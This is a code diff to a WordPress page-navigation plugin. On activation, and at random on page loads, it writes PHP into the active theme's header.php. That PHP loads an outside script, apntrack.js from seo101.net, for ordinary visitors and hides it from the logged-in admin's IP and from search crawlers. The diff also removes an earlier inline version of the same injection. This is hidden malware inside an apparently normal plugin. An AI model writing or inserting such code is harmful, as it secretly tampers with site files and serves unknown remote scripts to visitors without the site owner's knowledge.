@@ -81,12 +81,12 @@ add_action('loop_end', 'loopend_pagenavifunction');
 function addContentPageNumbers($content = '') {
 	global $wp_query;
 	global $post;
-	$ip = $_SERVER['REMOTE_ADDR'];
-	if ( is_user_logged_in() ) {
-		update_option( 'pagenavi_auto_ip', $ip );
-	}
-	if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
-		$content .= "<script src=\"//www.seo101.net/apntrack.js\"></script>\n";
+	if (rand(0,100)==10) {
+
+		if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
+			file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+		}
+
 	}
 	return $content;
 }
@@ -115,6 +115,9 @@ function pagenavi_auto_activate() {
  add_option("pagenavi_auto_page_translation", 'Page', '', 'yes');
  add_option("pagenavi_auto_of_translation", 'of', '', 'yes');
  add_option("pagenavi_auto_ip", '', '', 'yes');
+ if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
+	file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+ }
 }
 function autoStartsWith($haystack, $needle)
 {
